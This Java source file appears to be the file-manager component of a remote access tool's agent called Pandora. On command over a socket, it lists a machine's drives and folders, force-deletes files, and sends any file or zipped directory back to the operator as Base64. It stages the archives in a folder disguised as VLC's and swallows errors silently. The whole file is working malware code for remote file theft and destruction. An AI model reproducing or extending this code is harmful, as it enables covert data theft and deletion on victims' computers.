package org.pandora.agent.control.impl;

import org.apache.commons.io.FileUtils;
import org.pandora.agent.Client;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileManagerController {

    private final Client client;
    private final Random random;

    public FileManagerController(final Client client) {
        this.client = client;
        this.random = new Random();
    }

    public void list(final String requestId, String filePath) {
        filePath = filePath.replace("(doubleDot)", ":").replace("(hashtag)", "#");
        String result;
        File[] paths = File.listRoots();
        if (!filePath.equals("default")) {
            File file = new File(filePath);
            if (file.exists()) {
                paths = file.listFiles();
            } else {
                this.client.getSocketUtils().write("fileManager:list:" + requestId + ":No result:No result:No result#");
                return;
            }
        }
        if (paths == null) {
            this.client.getSocketUtils().write("fileManager:list:" + requestId + ":No result:No result:No result#");
            return;
        }
        result = Arrays.stream(paths).map(path -> path.getAbsolutePath().replace("#", "(hashtag)").replace(":", "(doubleDot)") + ":" + (path.getName().equals("") ? "Local Disk" : path.isDirectory() ? "[Dir] " : "[File] ") + path.getName().replace("#", "(hashtag)").replace(":", "(doubleDot)") + ":" + this.getFileCreation(path.getAbsolutePath()).replace("#", "(hashtag)").replace(":", "(doubleDot)") + "#").collect(Collectors.joining());
        this.client.getSocketUtils().write("fileManager:list:" + requestId + ":" + (result.equals(" ") || result.equals("") ? "No result:No result:No result#" : result));
    }

    public void delete(final String requestId, String path) {
        final String filePath = path.replace("(doubleDot)", ":").replace("(hashtag)", "#");
        boolean result;
        try {
            final File deletable = Paths.get(filePath).toFile();
            if (!deletable.isDirectory()) FileUtils.forceDelete(deletable);
            else FileUtils.deleteDirectory(deletable);
            result = true;
        } catch (final IOException ignore) {
            result = false;
        }
        this.client.getSocketUtils().write("fileManager:delete:" + requestId + ":" + result + ":" + path);
    }

    public void download(final String requestId, String filePath) {
        filePath = filePath.replace("(doubleDot)", ":").replace("(hashtag)", "#");
        final File file = new File(filePath);
        String result;
        boolean zip = false;
        Path p = null;
        if (file.isDirectory()) {
            try {
                p = Files.createFile(Paths.get(System.getenv("LOCALAPPDATA") + "\\VLC\\" + this.random.nextInt(Integer.MAX_VALUE) + ".zip"));
                try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
                    final Path pp = Paths.get(filePath);
                    Files.walk(pp)
                            .filter(path -> !Files.isDirectory(path))
                            .forEach(path -> {
                                ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                                try {
                                    zs.putNextEntry(zipEntry);
                                    Files.copy(path, zs);
                                    zs.closeEntry();
                                } catch (IOException ignore) {
                                }
                            });
                }
                final FileInputStream fileInputStream = new FileInputStream(p.toFile());
                final byte[] data = new byte[(int) p.toFile().length()];
                fileInputStream.read(data);
                fileInputStream.close();
                result = Base64.getEncoder().encodeToString(data);
                zip = true;
            } catch (IOException ignore) {
                result = "An error occurred";
            }
        } else {
            try {
                final FileInputStream fileInputStream = new FileInputStream(file);
                final byte[] data = new byte[(int) file.length()];
                fileInputStream.read(data);
                fileInputStream.close();
                result = Base64.getEncoder().encodeToString(data);
                if (result.equals("")) result = "No content.";
            } catch (final IOException ignore) {
                result = "An error occurred";
            }
        }
        if (result.equals("")) result = "An error occurred";
        result = result.replace("#", "(hashtag)").replace(":", "(doubleDot)");
        this.client.getSocketUtils().write("fileManager:download:" + requestId + ":" + result + ":" + file.getName().replace("#", "(hashtag)").replace(":", "(doubleDot)") + (zip ? ".zip" : ""));
        if (p != null) {
            try {
                FileUtils.forceDelete(p.toFile());
            } catch (final IOException ignore) {
            }
        }
    }

    private String getFileCreation(final String path) {
        try {
            return String.valueOf(Files.readAttributes(Paths.get(path), BasicFileAttributes.class).creationTime());
        } catch (final IOException ignore) {
            return "No result";
        }
    }
}